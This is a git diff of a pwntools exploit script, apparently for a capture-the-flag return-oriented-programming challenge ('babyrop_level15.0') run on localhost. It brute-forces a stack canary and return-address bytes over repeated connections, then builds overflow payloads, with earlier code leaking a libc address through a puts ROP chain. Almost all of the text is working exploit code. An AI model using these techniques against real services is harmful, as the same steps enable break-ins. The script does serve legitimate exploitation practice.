@@ -1,11 +1,11 @@
 from pwn import *
 import time 
 
-offset = 0x60
+offset = 0x58
 s = '''
 b * challenge+108
 '''
-binary = './babyrop_level14.1_patched'
+binary = './babyrop_level15.0'
 elf = ELF(binary)
 libc = ELF('./libc.so.6')
 
@@ -22,6 +22,47 @@ context.binary = binary
 # output might be different
 # might not have Goodbye
 canary = b'\x00'
+
+'''
+p = remote('localhost', 1337)
+gdb.attach(p, s)
+
+payload = flat(
+	b'A'* offset,
+	canary + b'\xcc'
+)
+p.send(payload)
+p.interactive()
+'''
+def kill_latest_connection(port=1337):
+    """Kill only the most recent process listening on the specified port"""
+    try:
+        # Get all PIDs using the port
+        cmd = f"lsof -i :{port} -t"
+        output = subprocess.check_output(cmd, shell=True).decode().strip()
+        
+        if output:
+            pids = output.split('\n')
+            # If multiple processes exist, kill only the last one (most recent)
+            if len(pids) > 1:
+                latest_pid = pids[-1]
+                kill_cmd = f"kill -9 {latest_pid}"
+                subprocess.call(kill_cmd, shell=True)
+                print(f"Killed latest connection (PID: {latest_pid})")
+    except Exception as e:
+        print(f"Error killing process: {e}")
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+
 for i in range(7):
 	for new_byte in range(0xff + 1):
 		p = remote('localhost', 1337)
@@ -29,23 +70,25 @@ for i in range(7):
 		
 		#gdb.attach(p, s)
 		payload = flat(
-			b'A'* 0x68,
+			b'A'* offset,
 			canary + p8(new_byte)
 		)
 		
 
 		try:
 			p.send(payload)
-			response = p.recvuntil(b"Goodbye!", timeout = 1)
+			response = p.recvuntil(b"*** stack smashing detected ***", timeout = 1)
 			print(response)
-			if b"Goodbye!" in response:
-				print("Success! byte = ", hex(new_byte))
-				canary += p8(new_byte)
+			if b"*** stack smashing detected ***" in response:
+				print("failed")
+			
 			p.close()
-			break
 
 		except EOFError:
-			print("failed")
+
+			print("Success! byte = ", hex(new_byte))
+			canary += p8(new_byte)
+			break
 			p.close()
 		
 print("Successfully brute-forced the canary, it is: ", canary.hex())
@@ -57,20 +100,63 @@ print("Successfully brute-forced the canary, it is: ", canary.hex())
 # 0x560a1434d350
 
 # 00101320
-rip = b'\xa2'
-'''
-p = remote('localhost', 1337)
-gdb.attach(p, s)
 
-payload = flat(
-	b'A'* 0x68,
-	canary,
-	b'B' * 8,
-	rip
-)
-p.send(payload)
-p.interactive()
+
 '''
+
+for rip in range(0x6, 0xff + 1):
+	p = remote('localhost', 1337)
+
+
+	payload = flat(
+		b'A'* offset,
+		canary,
+		b'B' * 8,
+		p8(rip)
+	)
+	try:
+		#gdb.attach(p, s)
+		p.send(payload)
+		#p.interactive()
+		response = p.recvuntil("Goodbye!\nThis challenge", timeout = 1)
+		kill_latest_connection()
+		print(response)
+		print("Success! byte = ", hex(rip))
+		
+		p.close()
+		break
+		
+	except:
+		print("failed")
+		p.close()
+
+
+p.interactive()
+
+
+
+
+
+'''
+
+
+
+
+
+
+
+
+
+        
+        
+        
+        
+        
+        
+
+rip = b'\x09'
+
+
 
 for i in range(5):
 	for new_byte in range(0xff + 1):
@@ -79,7 +165,7 @@ for i in range(5):
 		
 		
 		payload = flat(
-			b'A'* 0x68,
+			b'A'* offset,
 			canary,
 			b'B' * 8,
 			rip + p8(new_byte)
@@ -87,40 +173,48 @@ for i in range(5):
 
 		try:
 			p.send(payload)
-			response = p.recvuntil("Leaving!\n### Goodbye!", timeout = 1)
+			response = p.recvuntil("Goodbye!\n###\n### Welcome to", timeout = 0.1)
+			kill_latest_connection()
 			print(response)
-			if b"Leaving!\n### Goodbye!" in response:
+			if b"Goodbye!\n###\n### Welcome to" in response: # starting text of the program, but also creates a new connection port here
 				print("Success! byte = ", hex(new_byte))
 				rip += p8(new_byte)
-			p.close()
+				#kill_extra_connections()
+				p.close()
+				#time.sleep(0.1)
 			break 
 			
 		except EOFError:
 			print("failed")
 			p.close()
+		
+		#time.sleep(0.5)
+			
 
 
 rip = int.from_bytes(rip, 'little')
-elf.address = rip - 0x20a2
-print("Successfully brute-forced the program base address, it is: ", hex(elf.address))
+#elf.address = rip - 0x20a2
+print("Successfully brute-forced a libc address leak, it is: ", hex(rip))
 
 
 # gadgets
 
-pop_rdi = elf.address + 0x0000000000002133 
 
 
 p = remote('localhost', 1337)
-#gdb.attach(p, s)
+gdb.attach(p, s)
 payload = flat(
-	b'A'* 0x68,
+	b'A'* offset,
 	canary,
 	b'B' * 8,
-	p64(pop_rdi),
-	elf.got['puts'],
-	elf.plt['puts']
+	p64(0xdeadbeef)
 )
 p.send(payload)
+
+
+p.interactive()
+
+
 
 p.recvuntil(b'Leaving!\n')
 leak = p.recv(6)  # Just receive exactly 6 bytes for the address
